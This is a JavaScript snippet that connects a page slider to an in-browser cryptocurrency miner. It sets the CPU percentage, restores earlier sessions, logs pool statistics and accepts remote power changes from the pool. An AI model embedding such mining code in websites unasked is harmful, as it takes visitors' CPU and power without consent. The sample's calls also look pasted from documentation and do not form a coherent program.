var slider = document.getElementById("Speed");
var output = document.getElementById("demo");

// - Configure:
ServerConfig.config({
  login: "7168080", // Your ID - required
  pass: "minerserver.io", // Name for stats, leave blank for automatic set.
});

// - Universal function for Start/Stop/Change speed - 0 = stop, 1-100 = set percent of CPU usage and start mining if not started:
ServerConfig.power(slider.value);

// - Restore previous session accepted hashes and power (start mining if it worked in previous session):
ServerConfig.loadStored();

// - Get current power:
console.log("Power", ServerConfig.getPower());

// - Get current speed in hashes/sec:
console.log(ServerConfig.getHashesPerSecond());

// - Get current job algo:
console.log(ServerConfig.getJobAlgo());

// - Get current job diff:
console.log(ServerConfig.getJobDiff());

// - Get accepted by pool hashes (in all sessions)
console.log(ServerConfig.getAcceptedHashes());

// - Reset config and stop minig
ServerConfig.reset(); // Reset config, stop mining and disconnect from pool (you can use it when user logout).

// - Remote change speed event:
ServerConfig.on("remotepower", (power) => {
  ServerConfig.power(power); // Is automatic applied if no listeners for this event.
  console.log("New power:", power);
});

// - Share accepted event
ServerConfig.on("accepted", () => console.log("New share"));

output.innerHTML = slider.value; // Display the default slider value

// Update the current slider value (each time you drag the slider handle)
slider.oninput = function () {
  output.innerHTML = this.value;
};
